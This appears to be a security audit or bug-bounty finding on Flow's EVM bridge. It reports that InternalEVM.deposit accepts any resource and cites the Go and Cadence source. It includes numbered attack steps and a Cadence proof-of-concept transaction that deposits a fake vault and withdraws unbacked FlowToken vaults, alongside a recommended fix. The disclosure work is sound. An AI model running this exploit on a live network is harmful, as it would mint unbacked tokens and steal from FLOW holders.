### Title
`InternalEVM.deposit` Accepts `@AnyResource`, Enabling EVM FLOW Balance Inflation Without Real Token Backing — (`fvm/evm/stdlib/contract.go`, `fvm/evm/impl/impl.go`)

---

### Summary

The `InternalEVM.deposit` host function declares its `from` parameter as `@AnyResource` instead of the specific `@FlowToken.Vault` type. The Go implementation reads only the `balance` field from whatever resource is passed, then credits the target EVM account with that amount — without verifying the resource is a genuine `FlowToken.Vault`. Because `InternalEVM` is a predeclared value accessible from any Cadence transaction, an unprivileged attacker can pass a custom resource with an arbitrarily large `balance` field to inflate EVM FLOW balances, then withdraw those balances back to Cadence as freshly-constructed `FlowToken.Vault` resources that have no real FLOW backing.

---

### Finding Description

**Root cause — type declaration (`fvm/evm/stdlib/contract.go`):**

The `InternalEVMTypeDepositFunctionType` declares the `from` parameter as `sema.AnyResourceType`:

```go
var InternalEVMTypeDepositFunctionType = &sema.FunctionType{
    Parameters: []sema.Parameter{
        {
            Label:          "from",
            TypeAnnotation: sema.NewTypeAnnotation(sema.AnyResourceType), // ← accepts ANY resource
        },
        {
            Label:          "to",
            TypeAnnotation: sema.NewTypeAnnotation(EVMAddressBytesType),
        },
    },
    ReturnTypeAnnotation: sema.NewTypeAnnotation(sema.VoidType),
}
``` [1](#0-0) 

**Root cause — implementation (`fvm/evm/impl/impl.go`):**

The Go handler reads only the `balance` field from the passed resource and credits the EVM account — no type identity check is performed:

```go
amountValue, ok := fromValue.GetField(
    context,
    fungibleTokenVaultTypeBalanceFieldName,
).(interpreter.UFix64Value)
// ...
account.Deposit(types.NewFlowTokenVault(amount))
``` [2](#0-1) 

The comment in the code explicitly notes the vault is intentionally not destroyed, because destroying it would reduce the Cadence-side total supply — but this design assumes the resource passed is always a real `FlowToken.Vault`: [3](#0-2) 

**Contrast with the public Cadence API:**

The public-facing `EVM.EVMAddress.deposit` and `EVM.CadenceOwnedAccount.deposit` functions in `contract.cdc` correctly enforce `@FlowToken.Vault`:

```cadence
fun deposit(from: @FlowToken.Vault) { ... }
``` [4](#0-3) [5](#0-4) 

However, `InternalEVM` is a predeclared value injected into the Cadence environment, making it callable directly from any user transaction — bypassing the type-safe wrappers entirely.

**Withdrawal mints new vaults:**

When EVM FLOW is withdrawn back to Cadence, `newInternalEVMTypeWithdrawFunction` constructs a brand-new `FlowToken.Vault` composite value from the EVM account's balance:

```go
return interpreter.NewCompositeValue(
    context,
    common.NewAddressLocation(gauge, handler.FlowTokenAddress(), "FlowToken"),
    "FlowToken.Vault",
    ...
)
``` [6](#0-5) 

This means inflated EVM balances can be converted into real, spendable `FlowToken.Vault` resources.

---

### Impact Explanation

An attacker can:
1. Deploy a Cadence contract defining a resource with a `balance: UFix64` field set to an arbitrarily large value.
2. Call `InternalEVM.deposit(from: <-fakeVault, to: attackerEVMAddress)` directly in a transaction.
3. The EVM account is credited with the fake balance; the fake resource is consumed.
4. Call `EVM.CadenceOwnedAccount.withdraw(balance: ...)` to receive freshly-minted `FlowToken.Vault` resources with no real FLOW backing.

This inflates the total FLOW supply on the EVM side and allows the attacker to extract real `FlowToken.Vault` resources, diluting all existing FLOW holders and potentially draining the EVM escrow. The impact is **permanent loss of funds** for all EVM FLOW holders, analogous to the Illuminate PT inflation attack where redemptions are share-based and diluted by unbacked supply.

---

### Likelihood Explanation

Any unprivileged Cadence transaction can call `InternalEVM.deposit` directly — no special role, key, or capability is required. The attacker only needs to deploy a trivial custom contract with a resource containing a `balance: UFix64` field. This is a low-barrier, high-impact attack path.

---

### Recommendation

Change `InternalEVMTypeDepositFunctionType` to require the specific `FlowToken.Vault` resource type instead of `@AnyResource`:

```go
// In fvm/evm/stdlib/contract.go
var InternalEVMTypeDepositFunctionType = &sema.FunctionType{
    Parameters: []sema.Parameter{
        {
            Label:          "from",
            TypeAnnotation: sema.NewTypeAnnotation(flowTokenVaultType), // specific FlowToken.Vault type
        },
        ...
    },
    ...
}
```

Additionally, the Go implementation in `newInternalEVMTypeDepositFunction` should assert the static type of `fromValue` matches `FlowToken.Vault` before reading its `balance` field, as a defense-in-depth measure.

---

### Proof of Concept

```cadence
// 1. Deploy attacker contract
contract AttackerContract {
    access(all) resource FakeVault {
        access(all) var balance: UFix64
        init(amount: UFix64) { self.balance = amount }
    }
    access(all) fun createFakeVault(amount: UFix64): @FakeVault {
        return <- create FakeVault(amount: amount)
    }
}

// 2. Exploit transaction
import InternalEVM from <predeclared>
import EVM from <system>
import AttackerContract from <attacker>

transaction {
    prepare(attacker: auth(Storage) &Account) {
        // Create a fake vault with 1,000,000 FLOW balance
        let fakeVault <- AttackerContract.createFakeVault(amount: 1_000_000.0)

        // Create a COA to receive the inflated balance
        let coa <- EVM.createCadenceOwnedAccount()

        // Bypass the FlowToken.Vault type check — InternalEVM accepts @AnyResource
        InternalEVM.deposit(from: <-fakeVault, to: coa.addressBytes)

        // Withdraw inflated balance as real FlowToken.Vault
        let realVault <- coa.withdraw(balance: EVM.Balance(attoflow: 1_000_000_000_000_000_000_000_000))

        // realVault is a genuine FlowToken.Vault with 1,000,000 FLOW, unbacked
        attacker.storage.save(<-realVault, to: /storage/stolenFlow)
        destroy coa
    }
}
```

### Citations

**File:** fvm/evm/stdlib/contract.go (L424-435)
```go
var InternalEVMTypeDepositFunctionType = &sema.FunctionType{
	Parameters: []sema.Parameter{
		{
			Label:          "from",
			TypeAnnotation: sema.NewTypeAnnotation(sema.AnyResourceType),
		},
		{
			Label:          "to",
			TypeAnnotation: sema.NewTypeAnnotation(EVMAddressBytesType),
		},
	},
	ReturnTypeAnnotation: sema.NewTypeAnnotation(sema.VoidType),
```

**File:** fvm/evm/impl/impl.go (L648-679)
```go
			amountValue, ok := fromValue.GetField(
				context,
				fungibleTokenVaultTypeBalanceFieldName,
			).(interpreter.UFix64Value)
			if !ok {
				panic(errors.NewUnreachableError())
			}

			amount := types.NewBalanceFromUFix64(cadence.UFix64(amountValue.UFix64Value))

			// Get to address

			toAddressValue, ok := invocation.Arguments[1].(*interpreter.ArrayValue)
			if !ok {
				panic(errors.NewUnreachableError())
			}

			toAddress, err := AddressBytesArrayValueToEVMAddress(context, toAddressValue)
			if err != nil {
				panic(err)
			}

			// NOTE: We're intentionally not destroying the vault here,
			// because the value of it is supposed to be "kept alive".
			// Destroying would incorrectly be equivalent to a burn and decrease the total supply,
			// and a withdrawal would then have to perform an actual mint of new tokens.

			// Deposit

			const isAuthorized = false
			account := handler.AccountByAddress(toAddress, isAuthorized)
			account.Deposit(types.NewFlowTokenVault(amount))
```

**File:** fvm/evm/impl/impl.go (L804-824)
```go
			return interpreter.NewCompositeValue(
				context,
				common.NewAddressLocation(gauge, handler.FlowTokenAddress(), "FlowToken"),
				"FlowToken.Vault",
				common.CompositeKindResource,
				[]interpreter.CompositeField{
					{
						Name: "balance",
						Value: interpreter.NewUFix64Value(gauge, func() uint64 {
							return uint64(ufix)
						}),
					},
					{
						Name: sema.ResourceUUIDFieldName,
						Value: interpreter.NewUInt64Value(gauge, func() uint64 {
							return handler.GenerateResourceUUID()
						}),
					},
				},
				common.ZeroAddress,
			)
```

**File:** fvm/evm/stdlib/contract.cdc (L202-202)
```text
        fun deposit(from: @FlowToken.Vault) {
```

**File:** fvm/evm/stdlib/contract.cdc (L563-563)
```text
        fun deposit(from: @FlowToken.Vault) {
```
